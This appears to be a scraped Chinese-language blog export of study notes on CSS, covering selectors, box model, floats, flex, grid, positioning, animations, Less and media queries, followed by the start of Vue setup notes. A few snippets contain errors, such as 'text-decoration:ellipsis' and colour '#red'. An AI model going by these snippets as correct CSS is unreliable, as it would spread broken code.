这里的175指的是设计图上的宽度为175px&#125; 选择器 样式冲突：冲突时由选择器的权重（优先级）决定。比较时要将所有选择器的优先级相加计算。但选择器的累加不会超过其最大的数量级，即类选择器最高也不会超过id选择器的优先级。并集（分组）选择器单独计算。 「选择器越具体，优先级越高」：内联样式 1000 &gt; id选择器 100&gt; 类和伪类选择器 10&gt; 元素选择器 1&gt; 通配选择器 0&gt; 继承的样式 没有优先级；在样式最后加!important直接升为最高优先级。若优先级计算后相等，优先使用靠下的样式。 元素选择器：根据标签名选中指定的元素。语法：标签名&#123;&#125;，如h1&#123;&#125;。 id选择器：根据id选中 一个 元素。语法：#id属性值&#123;&#125;。 类选择器：根据类名选中 一组 元素。语法：.class属性值&#123;&#125;。 一个标签可以有多个class，class中间用空格分开。如&lt;p class=&quot;cla1 cla2&quot;&gt;。 通配选择器：选中页面所有元素。语法：*&#123;&#125;。 复合选择器 交集选择器：选择器1选择器2选择器n&#123;&#125;，如div.cla1&#123;&#125;。 如含有元素选择器，必须使用元素选择器开头。 并集选择器（分组选择器）:选择器1,选择器2,...,选择器n&#123;&#125;。 关系选择器 父元素（ 直接 包含子元素）、子元素（ 直接 被父元素包含）；祖先元素（直接或间接包含后代元素）、后代元素；兄弟元素 子元素选择器：父元素 &gt; 子元素&#123;&#125;。 后代元素选择器：祖先 后代&#123;&#125; 兄弟元素选择器：1. 选择 下一个 兄弟，前一个 + 下一个&#123;&#125;。2. 选择 下面所有 兄弟，前一个 ～ 下一个&#123;&#125;。 属性选择器 选择含有指定属性的元素：[属性名] 选择含有指定属性和属性值的元素：[属性名=属性值] 选择属性值以指定值开头的元素：[属性名^=指定值] 选择属性值以指定值结尾的元素：[属性名$=指定值] 选择属性值中含有指定值的元素：[属性名*=指定值] 伪类选择器伪类，一般使用:开头，是一种特殊的类，是不存在的类，用于描述一个元素的特殊 状态 。如第一个子元素、被点击的元素、鼠标移入的元素… 排序伪类语法：:first-child，第一个子元素；:nthchild()，选中第n个子元素，具体n值写在括号内； :nthchild()，括号内的特殊值括号内写n则为全选，2n或even为选中偶数位元素，2n+1或odd为选中奇数位元素； 以上的伪类都是根据所有的子元素进行的排序！想要在同类型元素中进行排序，需要使用形如:first-of-type的伪类，用法相似。 否定伪类如:not(): 将符合条件的元素从选择器中去除。eg:.cla1 li:not(:last-child)。 超链接伪类没访问过的链接：可用:link访问过的链接：:visited。由于隐私原因，只能修改链接颜色鼠标状态：:hover为鼠标移入的状态。 :active为鼠标点击的状态。 事实上，“ :link ” 可以表示一切正常的链接。 伪元素选择器伪元素，一般使用::开头，是一种特殊的元素，是不存在的元素。类似伪类。 如::first-letter。默认是行内元素！ ::before、::after：必须结合content属性使用。 content中的内容是通过css添加的，是不能选中的！ 示例：1234div::before&#123; content:&#x27;abc&#x27;; color:red;&#125; 盒模型 计算盒子整体 可见 大小时需要把内容区content、内边框padding、边框border都计算在内！ 内容区：content width和height设置的是内容区（content）的大小。 内边距：padding， 影响盒大小；背景颜色会延伸到内边距（默认时）。 边框：border。 需要至少设置3个样式——宽度（border-width）、颜色（border- color）、样式（border-style，设置为none则无边框）。 简写属性：border: solid 10px red，无顺序要求。 关于border-width、border- color和border-style1.都可以省略（有默认值）；都有border-xxx-width/color/style的形式2.四个值：上，右，下，左；三个值：上，左右，下；两个值：上下，左右 外边框：margin，不影响盒子可见框大小，但影响盒子的实际大小和位置。 注意，margin-top和margin-left移动自己，margin-bottom挤别人，margin-right经常没用。可以设置为负值。 轮廓：outline，用来设置元素的轮廓线，用法和border一摸一样。唯一和border不一样的点就是轮廓不会影响可见框的大小。 阴影：box-shadow，用来设置元素的阴影效果，不会影响页面布局。起始位置和元素本身的位置完全重合。 box-shadow: 2px 5px 10px rgba(0,0,0,.3) 第一个值：水平偏移，正值向右，负值向左。 第二个值：垂直偏移，正值向下，负值向上。 第三个值：模糊半径。即使前两个值都为0，设置了模糊半径也能看到阴影。 第四个值：颜色，常用带透明度的rgba。 圆角：border-radius，可以分别指定四个角的圆角。 对某个角同时指定两个半径：椭圆圆角。border-top-left-radius:10px 20px 四个值：左上 右上 右下 左下 三个值：左上 右上&#x2F;左下 右下 两个值：左上&#x2F;右下 右上&#x2F;左下 不到四个值，缺哪个找哪个的对角值，这个值代表了两个角的半径。 将元素设置为圆形： border-radius:50% 水平布局一个元素在其父元素的内容区中存在，该元素的水平布局 必须满足： 左外边距+左边框+左内边距+width+右内边距+右边框+右外边距 &#x3D; 其父元素内容区的宽度但元素设置浮动float后，该等式不需要强制成立！ 等式中的宽度width，左外边距margin-left，左内边距padding-left可以设置为auto。 如果不满足，如何调整？（注意margin可以为负） 如果这7个值没有auto，浏览器会自动调整margin-right。 如果这7个值有一个auto，浏览器会自动调整auto。width的默认值即为auto。 如果这7个值有两个auto，且一个是width一个是margin，则宽度会调整到最大，设置为auto的外边距自动为0。 如果三个都是auto，则padding为0，width最大。（全屏） 如果将两个外边距auto，宽度固定，则会将外边距设置为相同的值。（元素在父元素居中） 经常利用这个特点使元素在子元素内居中 垂直布局 默认情况下父元素的高度会被内容撑开如果子元素的大小超过了父元素，则子元素会从父元素溢出 使用overflow属性设置父元素如何处理溢出的子元素，可选值如下： visible：默认值，子元素会从父元素中溢出，在父元素外部的位置显示 hidden：溢出内容会被裁剪，不会显示（“一剪没”） scroll：生成垂直和水平两个滚动条，通过滚筒条查看完整内容 auto：根据需要生成滚动条（水平还是垂直） overflow-x：单独处理水平方向的 overflow-y：单独处理垂直方向的 相邻的垂直方向外边距的折叠（重叠） 相邻 且 垂直才适用这种情况。 兄弟元素 两者都是正值：会取两者之间的较大值 特殊情况：一正一负：取两者的和；两负：取两者绝对值较大的 兄弟元素外边距的重叠对开发是有利的，不需要处理 父子元素 子元素的会传递给父元素（上外边距） 父子元素外边距的重叠会影响到页面布局，必须处理！解决方法：要么不用外边距（给父元素padding），要么别相邻（给父元素border，隔开外边距） 解决方案：::before伪元素 + display:table 1234.box1::before&#123; content:&#x27;&#x27;; display:table&#125; table既可以解决高度塌陷，又可以解决外边框重叠。 行内元素的盒模型 文字的垂直居中：要让一个文字在父元素中垂直居中，只需让父元素的line-height和父元素height相等。 行内元素不支持设置宽度和高度，因为行内元素没有内容区，宽高是对内容区而言的 行内元素支持设置padding、border和margin，但垂直方向的这些属性不会影响页面的布局 display，用来设置元素显示的类型 inline：将元素设置为行内元素 block：将元素设置为块元素 inline-block：将元素设置为行内块元素（既可以设置宽高，又不会独占一行，有点像替换元素的特点） 行内块元素同时具备行内元素和块元素的优点和缺点。尽量避免使用行内块元素！ table：将元素设置为一个表格 none：元素不在页面中显示 不占据页面的位置！ visibility，用来设置元素的显示状态 visible：默认值，元素在页面中正常显示 hidden：元素在页面中隐藏不显示 依然占据页面的位置！ 浮动 元素设置浮动后会完全从文档流中脱离，不再占用文档流的位置！脱离后，元素的一些特点也会发生变化。脱离文档流的特点如下： 块元素不再独占一行，且宽度和高度默认都被内容撑开 行内元素会变成块元素。 脱离文档流后，不需要再去区分块元素和行内元素! 设置浮动后，元素会向其父元素的左侧或右侧移动。默认值为none。 浮动元素不会从父元素中移出。 水平上，浮动元素向左或向右移动时， 不会超过 它前面的其他浮动元素。 垂直上，浮动元素不会超过它上边的浮动的兄弟元素，最多和它一样高。 若浮动元素的上边是一个没浮动的块元素，则浮动元素无法上移。 浮动元素不会盖住文字，文字会自动环绕在浮动元素周围。所以可以利用浮动设置文字环绕图片的效果。 浮动的高度塌陷问题在布局中，父元素的高度默认是被子元素撑开的。但是若子元素浮动后，其会完全脱离文档流，子元素从文档流中脱离将会无法撑起父元素的高度，导致父元素的高度丢失。其下一个元素会自动上移。页面布局混乱。 解决方案： 如果塌陷了的元素样式可以写死，可以直接给塌陷了的元素设置一个height。 BFC（Block Formatting Context）、clear和clearfix。 BFCBFC：CSS中的一个隐含属性，可以为一个元素开启BFC。开启BFC后，该元素会变成一个 独立的布局区域 。元素开启BFC后的特点如下： 开启BFC的元素不会被浮动元素覆盖 开启BFC的元素子元素和父元素的外边距不会重叠 开启BFC的元素可以包含浮动的子元素（解决高度塌陷） 由于BFC是一种隐含属性，不能直接开启，可以通过一些特殊的方式开启元素的BFC： （不推荐）设置元素的浮动（给想要包含浮动子元素的元素开启）。副作用：从文档流中脱离，宽度丢失。可能影响布局。 （不推荐）将元素设置为行内块元素。不会从文档流中脱离。副作用：宽度丢失。 （推荐）将元素的overflow设置为一个不是visible的属性：overflow：hidden或overflow：auto。 clear作用：清除浮动元素对当前元素产生的影响原理：设置清除浮动后，浏览器会自动为元素添加一个 上外边距，以使其位置不受其他元素的影响。可选值：left：清除左侧浮动元素对当前元素产生的影响；right：清除右侧浮动元素对当前元素产生的影响；both：清除两侧中最大影响的那侧（最常用）。 高度塌陷的最终解决方案：用::after伪类 12345.box1::after&#123; content:&#x27;&#x27;; clear:both; display:block/table; &#125; 解决高度塌陷和外边框重叠的最终方案（灵活，推荐）给存在这两种问题的元素直接添加一个clearfix类名： 12345.clearfix::before,.clearfix::after&#123; content:&#x27;&#x27;; display:table; clear:both;&#125; flex布局主要用来代替浮动完成页面布局。可以使元素带有弹性，让元素可以跟随页面大小的改变而改变。当父元素盒子设置为flex布局后，子元素的float、clear、vertical-align属性将失效。弹性容器：通过display:flex设置为块级弹性容器，display:inline-flex设置为行内的弹性容器。弹性元素：弹性容器的 直接子元素 是弹性元素。元素可以既是弹性容器，又是弹性元素。 弹性容器的样式主轴：弹性元素的排列方向；侧轴：与主轴垂直方向。凡是justify***都是主轴的，align***都是辅轴的。 容器中弹性元素的排列方式：flex-direction 弹性元素是否在容器中自动换行：flex-wrap 排列方式和换行的简写属性：flex-flow 对齐相关的样式： justify-content：元素在主轴如何对齐（如何分配主轴空白空间） flex-start、flex-end：沿主轴起边&#x2F;终边对齐 center：居中 space-around、space-between、space-evenly align-content：设置元素在辅轴如何对齐（如何分配辅轴空白空间）。可选值和justify-content一样，多一个stretch。 只能用于子项出现换行的情况（多行），单行下没有效果。 align-items：子项为单行时使用。设置元素在辅轴如何对齐。 适用于单行的情况，只有上对齐、下对齐、居中和拉伸。 stretch：默认值，将元素的长度设置为相同的值 flex-start、flex-end：沿辅轴起边&#x2F;终边对齐，不会拉伸元素 center：居中 base-line：基线对齐，用的不多。 弹性元素的样式只有三个：增长、缩短、基础长度。通过align-self覆盖当前元素上的align-items。 flex-grow、flex-shrink：指定弹性元素的伸展&#x2F;收缩系数。父元素的剩余空间会按照比例分配&#x2F;当父元素空间不足以容纳所有子元素时，对子元素进行压缩。 flex-basis：元素在主轴上的基础长度。默认auto，即参考元素自身的高度和宽度。 这三个值可以看作是弹簧的三个状态：伸长，压缩，放松。 可以通过简写属性flex设置弹性元素所有的三个样式。flex:增长 缩减 基础。 initial：即为flex:0 1 auto，只能减。 auto：即为flex:1 1 auto，可增可减。 none：即为flex:0 0 auto，元素没有弹性。 还可以使用order决定弹性元素的排列顺序。 grid布局与flex最大的不同就是，Flex是轴线布局，指定的都是针对轴线的位置，可以看作是一维布局；而Grid 布局则是将容器划分成行列，产生单元格，然后指定”项目所在”的单元格，可以看作是二维布局。通过dispaly:grid;（dispaly:inline-grid;）开启。 虽然grid布局很强大，但兼容性差于flex。使用前应注意兼容性问题。 容器属性行高和列宽：1.grid-template-columns：每一列的列宽，如grid-template-columns:100px 100px 100px，即显示为三列，每一列宽度100px 。和grid-template-columns:repeat(3,100px)效果相同。 auto-fill：当单元格大小固定，但容器大小不确定时，使用auto-fill属性进行自动填充。如grid-template-columns: repeat(auto-fill,100px)。 fr：为了方便表示比例关系，网格布局提供了fr关键字(fraction 的缩写，意为”片段”)。如grid-template-columns:repeat(4,1fr)，意为列宽平均分成四等份。grid-template-columns:1fr 2fr 3fr，意为列宽分成6份，各占 1 2 3 份。 minmax()：函数产生一个长度范围，表示长度就在这个范围之中，它接受两个参数，分别为最小值和最大值。第一个参数最小值,第二个最大值。 auto：表示由浏览器自己决定长度。 网格线：可以用方括号定义网格线名称，方便以后给盒子定位使用。如grid-template-columns: [c1] 100px [c2] 100px [c3] 100px [c4]。 2.grid-template-rows：每一行的行高。 间距：item相互之间的距离。1.row-gap：一行中相邻item的间距。2.column-gap：一列中相邻item的间距。3.gap：前二者的简写属性。 设置区域内单元格是否使用：grid-template-areas。用法如下图，名字相同标识在同一个区域，定位或者写项目属性的时候会用到。 设置子元素的排放顺序：划分网格后，容器的子元素会按照顺序自动放置在每一个网格。默认的放置顺序是”先行后列”，即先填满第一行，再开始放入第二行。1.grid-auto-flow:row：同默认放置方式。2.grid-auto-flow:column：先放入第一列，满了再开始放入第二列。3.grid-auto-flow:row dense：表示换行时留下的空间可以由下面的元素填补上去。![row dense](row dense›.png) 设置对齐相关的样式：1.justify-items：单元格内容的水平对齐方式。可选：start｜end｜center｜stretch。2.align-items：单元格内容的垂直对齐方式。可选同上。 属性place-items : start end是这两个属性的简写。 3.justify-content：整个内容区域（所有的项目的总和）的水平对齐方式。可选：start｜end｜center｜stretch｜space-around｜space-between｜space-evenly。4.align-content：整个内容区域（所有的项目的总和）的垂直对齐方式。可选同上。 设置多出来的项目的宽高：使用属性grid-auto-columns或grid-auto-rows。 项目属性根据在哪根网格线设置item的具体位置：使用grid-column-start / grid-column-end grid-row-start / grid-row-end。属性grid-column: 1 / 3是前两个的简写。指定了项目所占的格数，跨列数： 设置项目放在哪一个区域：通过grid-area配合grid-template-areas设置。grid-area和 grid-row-start / grid-column-start / grid-row-end / grid-column-end的缩写格式为：grid-area:1 / 1 / 2 / 3。 设置对齐相关的样式：通过justify-self / align-self / place-self。 定位用position属性。默认为static，即元素是静止的，没有开启定位。只要开了定位，就都是一个层级；和哪种定位无关。 关于层级：如果元素的层级一样，则优先显示靠下的元素。祖先元素的层级再高也不会盖住后代元素。 绝对定位：absolute相对于其包含块（containing block）定位。 关于包含块（正常情况下，包含块就是当前元素 最近 的祖先 块 元素）绝对定位的包含块：当前元素最近的开启了定位的祖先元素；若所有祖先元素都没开启定位，则根元素就是它的包含块。 若不设置偏移量，元素位置 不会发生变化。 开启绝对定位的元素会 从文档流中脱离 ，性质发生变化：行内变成块，块的宽高被内容撑开。 会使元素提升一个层级。 水平方向的布局等式需要添加left和right两个值。规则还和以前一样。 当发生过度约束时： 如果9个值中没auto，则自动调整right； 如果有auto（margin width left right），则自动调整auto的值：由于left和right的值默认是auto，所以当未设置它们的值且等式不满足时会自动调整这两个值。所以如果想通过margin设置居中的话必须要设置left和right为0。即水平居中：left: 0；right:0; margin-left:auto;margin-right:auto 绝对定位后，垂直方向的等式也必须满足：top+margin-top&#x2F;bottom+padding-top&#x2F;bottom+height&#x3D;包含块的高度 垂直居中：top:0;bottom:0;margin-top:0;margin-bottom:0 在 父元素 中垂直且水平居中：top:0;bottom:0;left:0;right:0; margin:auto 相对定位：relative“灵魂出窍：移出来的是魂，肉体还在之前的位置”偏移量：top,bottom,left,right，是定位元素和定位位置上下左右的距离。参照 元素自身在文档流 中的位置。而且， 没有脱离文档流。相对定位的特点： 开启后，若不设置偏移量，元素不会发生任何变化 会提升元素的层级 不会改变元素性质：块还是块，行内还是行内 固定定位：fixed也是一种绝对定位，大部分特点和绝对定位一样。唯一不同：固定定位永远参照浏览器的视口进行定位。不会随网页的滚动条滚动。 粘滞定位：sticky兼容性较差。一般不采用。（完全不兼容IE） 和相对定位的特点基本一致 不同的是粘滞定位可以在元素到达某个位置时进行固定，参照包含块。 文字font可以设置字体相关的所有属性。字体大小和字体族必须有。会覆盖单独设置的值。 12font: 样式（font-style） 字重（font-weight） 字体大小/行高（lineheight） 字体族font：italic bold 50px/2 微软雅黑，‘Times New Roman’,Times,serif; 行高lineheight和字体框行高lineheight指的是文字占有的实际高度。可以任意指定一个大小（px em），也可以设置为整数，整数的意义是字体的指定的倍数。 注意行高指的是 单行 的行高！ 字体框是字体存在的格子，设置font-size字体大小实际就是设置字体框的高度。 行高会在字体框上下平均分配。 可以将行高设置为和高度一样的值，使 单行 文字在父元素中垂直居中 行高经常还用来设置文字的行间距。css没有行间距的属性，利用公式行间距=行高-字体大小来间接控制行间距。 文本的水平和垂直对齐水平对齐：text-align，默认值left ；right ；居中对齐center ；两端对齐justify 注意text-align只能给块元素设置！ 垂直对齐：vertical-align，默认值基线对齐baseline；顶部对齐top；底部对齐bottom；居中对齐middle（中线对齐）。还可以直接指定值vertical-align:100px。 用img标签引入图片时，由于图片作为替换元素性质很像行内元素，默认是基线对齐，导致图片和它父元素的border之间有一条缝隙，这个缝隙就是图片的 基线 。想消除这个缝隙：将图片的vertical-align设置为除baseline外的任意值即可。 其他文本样式设置文本修饰：text-decoration。不兼容IE。可选：none ；overline ；underline ；line-through。 设置网页如何处理空白：white-space。可选：normal ；nowrap ；pre保留空白（预处理文本，保留html文件中写的格式）； 如何实现文字显示不全，有省略号的效果？ 123456.box&#123; width:200px; white-space:nowrap; overflow:hidden; text-decoration:ellipsis;&#125; 其中width设置文本包含框宽度；white-space:nowrap; overflow:hidden; text-decoration:ellipsis;三者缺一不可。 背景可以使用简写属性background设置。 background- size必须写在background-position后面，并且使用&#x2F;隔开。即background-position/background-size。 background-origin必须在background-clip前面。 1background: url(&quot;./1.png&quot;) #bfa center center/contain no-repeat； 同时设置背景图片和背景颜色：background-img:url(&quot;./1.png&quot;)。背景重复方式：background-repeat:no-repeat。背景图片的位置：background-position:top left。使用方位词时必须同时指定两个，如果只写一个另一个默认为center。也可以通过偏移量指定背景图片的位置。背景图的偏移量：background-origin:content-boc。背景图片大小：background-size：100% auto。第一个值宽度，第二个值高度，如果只写一个则另一个默认为auto（图片比例不变）。cover：图片比例不变，将元素铺满contain：图片比例不变，将图片在元素中完整显示 关于background-position的计算原点padding-box：默认值，background-position从内边距（左上角）开始计算content-box：从内容区处计算border-box：从边框处计算用background-clip:padding-box设置背景范围。border-box：默认值，背景会出现在边框的下面（内容区内边框和边框）padding-box：背景只到内边距（内容区和内边距出现），不会出现在边框content-box：背景只到内容区 用background-attachment:scroll设置背景图片是否跟随元素移动。scroll：默认值，背景图片会跟随元素移动fixed：背景会固定在页面中 渐变色 需要通过backgroud-image设置！ 线性渐变：backgroud-image:linear-gradient(to right,red,yellow,#bfa)。开头可以指定渐变方向，多个颜色默认平均分布。 可以平铺的线性渐变：backgroud-image:repeating-linear-gradient(to right,red,yellow,#bfa) 径向渐变（放射渐变）：backgroud-image:radial-gradient(100px 100px at top left,red,yellow) 语法：radial-gradient(大小at位置,颜色 位置,颜色 位置,...) 大小：circle、ellipse、closet&#x2F;fasthest-side&#x2F;corner 位置：top、right、left、center、bottom 表格table中，使用tr表示表格的一行，有几个&lt;tr&gt;就有几行。tr中，使用td表示一个单元格，有几个&lt;td&gt;就有几个单元格。用rowspan指定行宽。即纵向合并单元格。用colspan指定列宽。 下面是一个两行四列的表格。 123456789101112&lt;table border=&quot;1&quot; width=&quot;50%&quot; align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td colspan=&quot;2&quot;&gt;a1&lt;/td&gt; &lt;td&gt;c1&lt;/td&gt; &lt;td rowspan=&quot;2&quot;&gt;d1&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;a2&lt;/td&gt; &lt;td&gt;b2&lt;/td&gt; &lt;td&gt;c2&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 可以将一个表格分成三部分：头部thead，主体tbody，底部tfoot。还有&lt;th&gt;标签，表示头部部分的单元格，会有加粗效果。 若表格中没有使用tbody而是直接使用tr，那么浏览器会自动创建一个tbody，并且将tr全部放入tbody。因此 tr不是table的子元素 ！ 表格样式指定边框之间的距离：border-spacing设置边框的合并：border-collapse:collapse设置隔行变色效果：tr:nth-child(odd)&#123;backgroundcolor:gray;&#125; 默认情况下元素在td中垂直居中。也可以通过vertical-align设置垂直对齐方式。用text-align设置水平对齐方式。（top bottom center） 利用这个特性，可以通过将父元素display:table和vertical-align让子元素垂直居中。注意水平居中仍需要用margin:0 auto实现，不能直接使用text-align。 表单 数据要提交到服务器中，必须要为元素指定一个name属性！ 123456&lt;form action=&quot;target.html&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;这是一个文本框&quot; autocomplete=&quot;off&quot;&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;这是一个密码框&quot; disabled&gt; &lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot; value=&quot;这是一个提交按钮&quot; readonly&gt;&lt;/form&gt; 必填项action：内容为表单要提交的服务器的地址。属性autocomplete：是否开启自动补全。 单选框：同一个“name”字段即可划分到同一组单选按钮中，“value”属性会作为用户填写的值发给服务器。“checked”可以将单选按钮设置为默认选中。 12&lt;input type=&quot;radio&quot; name=&quot;group1&quot; value=&quot;a&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;group1&quot; value=&quot;b&quot; checked&gt; 还有多选框（type&#x3D;”checkbox”）、下拉列表（&lt;select&gt;&lt;option&gt;)等。 过渡简写属性：transtion。只有一个要求：如果要写 延迟 ，则两个时间中的第一个是持续时间。可以指定一个属性发生变化时的切换方式。 注意过渡时必须有两个有效数值！在它们之间过渡。auto不能起作用。 要执行过渡的属性：transtion-property:width。多个属性间使用，隔开，若所有属性都需要过渡，用all关键字。 过渡效果持续时间：transtion-duration。 过渡的时序函数：transtion-timing-function。 默认为ease，慢速开始，先加速再减速。 其他可选值：linear,ease-in,ease-in-out。用cubic-bezier()自己指定时序函数，参考本链接。 用steps()分布执行过渡效果。可以设置一个第二个值：end，在时间结束时执行过渡（默认值）; start，在时间开始时执行过渡。 过渡效果的延迟：transtion-delay，等待一段时间后再执行过渡。 动画简写属性：animation。只有一个要求：如果要写 延迟 ，则两个时间中的第一个是持续时间。过渡需要在某个属性发生变化时才会触发。动画可以自动触发。设置动画效果，必须先设置一个 关键帧 ，关键帧设置了动画执行的每一个步骤。 要对当前元素生效的关键帧的名字：animation-name:test 动画持续时间、延时和时序函数类似过渡：animation-duration animation-delay animation-timing-function 动画执行次数：animation-iteration-count 动画运动方向：animation-direction。可选：normal reverse alternate alternate-reverse。 动画执行状态：animation-play-state。可选：running paused 动画填充模式：animation-fill-mode。可选：none，默认值，动画执行完毕元素回到原来位置； forwards，动画执行完毕元素停在结束位置；backwards，动画延时等待时元素处于开始状态；both，结合了forwards和backwards。 关键帧12345678910111213@keyframes test&#123; /* from表示动画的开始位置，也可以使用0% */ from&#123; margin-top: 0; &#125; 25%,to&#123; margin-top: 400px; animation-timing-function: ease-out; &#125; 50%&#123; margin-top: 100px; &#125; /* to表示动画的结束位置，也可以使用100% */ 变形通过CSS改变元素的形状或位置。不会影响到页面布局。变形：transform。指定变形原点：transform-origin：0 0 平移使用translateX(100%)等。百分比是相对于 自身 去算的。之前所说的垂直且水平居中的方法：top:0;bottom:0;left:0;right:0; margin:auto，只适用于元素大小确定的情况；若元素大小是被内容撑开的则不能使用！因为在width、height、margin均为auto的情况下会优先调整宽和高。 利用X、Y轴方向上的平移实现水平&#x2F;垂直居中，适用于元素大小被内容撑开的情况：水平居中：left:50%; transform:translateX(-50%);水平且垂直居中：left:50%; top:50%; transform:translateX(-50%) translateY(-50%);。 Z轴平移：立体效果（近大远小）。默认情况下网页不支持透视。如果需要看见效果，必须设置网页视距如：perspective：800px。一般在html或body标签的样式中设置。 旋转使用rotateX()使元素沿着x(y z)轴旋转指定的角度。是否显示元素背面：backface-visibility：hidden 缩放使用scaleX()等实现各个方向的缩放。 less事实上，css原生也支持变量的设置和计算函数calc()，但兼容性欠佳。 1234567html&#123; --color:#bfa;&#125;.box&#123; width:calc(400x/2); color:var(--color);&#125; less是一门css的预处理语言。它是css的增强版，通过less可以编写更少的代码实现更强大的样式。在less中添加了很多新特性，如对变量的支持，对mixin的支持，在less中所有的数值都可以直接进行运算… 新版less中，除法运算必须带着单位放在括号内！ 语法大体上和css一致，但增加了许多对css的扩展。所以浏览器无法直接执行less代码，要执行必须将less转化为css，然后再由浏览器执行。在vscode中，需要安装插件：easy less。 用//对less进行单行注释，这种注释方法中的内容不会被解析到css中。用/* */也可以对less进行注释，内容会被解析到css文件中。 可以通过在less文件开头@import &quot;demo.less&quot;引入其他外部less文件，方便模块化开发。 语法变量：语法为@变量名。变量发生重名时优先使用比较近的变量。 12345678910111213@a:200px;@b:box2;// 作为类名或一部分值使用时必须以 @&#123;变量名&#125; 的形式使用.@&#123;b&#125;&#123; // 直接使用以 @变量名 的形式使用 width:@a;&#125;div&#123; width:300px; height:$width;&#125; 父元素： 1234567891011121314.box1&#123; &gt;.box3&#123; color:blue; // &amp; 表示的是外层的父元素box3 &amp;:hover&#123; color:yellow; &#125; &#125; // &amp; 表示的是外层的父元素box1。 div &amp;&#123; width:300px; &#125;&#125; 扩展：:extend()。对当前选择器扩展指定选择器的样式（选择器分组） 1234567.p1&#123; width:100px; height:200px;&#125;.p2:extend(.p1)&#123; color:red;&#125; 功能类似的还有混合函数。 1234567891011121314151617181920212223242526// 也可以直接引用指定的样式，相当于将p1的样式在这复制。// mixin混合.p3&#123; .p1();&#125;// 使用类选择器时可以在选择器后边添加括号，这就创建了一个mixins。再引用的时候可以省略括号。.p4()&#123; width:100px;&#125;.p5&#123; .p4;&#125;// 在混合函数中可以直接设置变量，也可以给变量设置默认值。设置默认值再引用可以不用全指定值。.test(@w,@h,@bg-color)&#123; width:@w; height:@h; border:1px solid @bg-color;&#125;div&#123; // 调用混合函数，按顺序或按名字传递参数 .test(200px,300px,#red) // 或 .test(@bg-color:red,@h:100px;@w:300px)&#125; 媒体查询语法：@media 查询规则&#123;&#125;。 媒体类型 all：所有设备 print：打印设备 screen：带屏幕的设备 speech：屏幕阅读器 媒体特性 width、height：视口宽度、视口高度 min-width、max-width：视口大于&#x2F;小于指定宽度时生效 样式切换的分界点称为断点，也就是网页样式会在这个点发生变化。 常用断点 小于768：超小屏幕，max-width&#x3D;768px 大于768：小屏幕，min-width&#x3D;768px 大于992：中型屏幕，min-width&#x3D;992px 大于1200:大屏幕，min-width&#x3D;1200px 可以在媒体类型前添加only，表示只有。only的使用主要是为了兼容一些老版本浏览器。使用逗号连接多个媒体类型，表示它们之间是 或 的关系。如@media print,screen&#123;&#125;；使用and连接多个媒体类型，表示它们之间是 且 的关系。在选择器前加not，表示“除了”，如@media not only screen and (min-width:768px)&#123;&#125;。一个较为完整的写法如下： 12345678910111213@media only screen and (min-width:768px) and (max-width:992px)&#123; body&#123; background-color: #red; &#125;&#125;// 或@media only screen &#123; @media (min-width:768px) and (max-width:992px)&#123; // 注意media后面要空格 body&#123; background-color: #red; &#125; &#125;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"HTML/CSS","slug":"前端/HTML-CSS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/HTML-CSS/"}],"tags":[{"name":"HTML","slug":"HTML","permalink":"https://avalooooooon.github.io/tags/HTML/"},{"name":"CSS","slug":"CSS","permalink":"https://avalooooooon.github.io/tags/CSS/"}]},{"title":"Vue笔记","slug":"Vue笔记","date":"2022-01-08T14:33:40.000Z","updated":"2022-01-08T14:33:40.000Z","comments":true,"path":"2022/01/08/Vue笔记/","link":"","permalink":"https://avalooooooon.github.io/2022/01/08/Vue%E7%AC%94%E8%AE%B0/","excerpt":"","text":"vscode插件：Vue 3 snippetsChrome插件：Vue.js devtools浏览器强制刷新：shift + 刷新按钮 简介Vue是一套用于构建用户界面的渐进式JS框架，渐进指Vue可以根据应用的复杂程度自底向上逐层的应用，对于简单应用它只需要一个轻量小巧的核心库，对于复杂应用则可以引入各式各样的Vue插件。它有以下特点： 采用组件化模式，提高代码复用率且更好维护。 声明式编码，让编码人员直接操作dom，提高开发效率。 使用虚拟dom+优秀的diff算法，尽量复用dom节点。 安装不使用cli在官网下载Vue.js和Vue.min.js，分别是开发版和生产版。在html文件head标签内指定路径，引入Vue.js：&lt;script src=&quot;vue.js&quot;&gt;&lt;/script&gt;。通过代码Vue.config.productionTip = false调整配置，以阻止 vue 在启动时生成生产提示。其它js代码应该都写在这句话之后。 使用cli环境：Windows101.安装node和npm环境 2.安装脚手架vue-cli 123npm install webpack -gnpm install --global vue-clivue -V 其中webpack是一个包管理工具，也是vue-cli的构建工具。上述命令可以完成webpack的全局安装。如果用nvs工具，可以在C:\\Program Files\\nodejs\\node_global中查看全局安装的vue-cli。 3.构建工程文件cd到工具区。在工作区中vue init webpack testproj以生成webpack脚手架。回车后可能会出现一些提示问题： 项目名称（注意名称中不要出现大写字母，否则会报错） 项目描述（可写可不写，看个人需要） 作者（可写可不写，看个人需要） vue编译，这个选默认即可，运行加编译Runtime + Compiler 是否安装vue-router是否安装vue路由工具 是否使用代码管理工具ESLint管理你的代码 后面几个是测试的工具，需要自己自行了解 可以选择在testproj工程新建好后系统自动进行初始化，安装package.json中描述的依赖。初始化完成后，cd进入项目文件夹。npm run dev运行项目。运行完成后打开浏览器，输入http://localhost:8080/ ，看到Welcome to Your Vue.js APP页面就可以说明项目脚手架已经初始化完成。 若出现报错&#39;webpack-dev-server&#39; 不是内部或外部命令，也不是可运行的程序或批处理文件，运行npm install webpack-dev-server --save-dev即可解决。 Vue核心和基础写法相比，使用Vue可以概括成不变化的都正常写，变化的都要动态指定，也就是前面带冒号，冒号就表示了动态。动态指定的数据都可以在浏览器的vue调试界面中看到。 12345678910111213141516171819202122232425&lt;body&gt; &lt;!-- 准备一个容器 --&gt; &lt;div id=&quot;demo&quot;&gt; &lt;h1&gt;hello,&#123;&#123;name.toUpperCase()&#125;&#125;&lt;/h1&gt; &lt;a v-bind:href=&quot;school.url&quot;&gt;百度一下&lt;/a&gt; &lt;/div&gt; &lt;script&gt; Vue.config.productionTip = false // 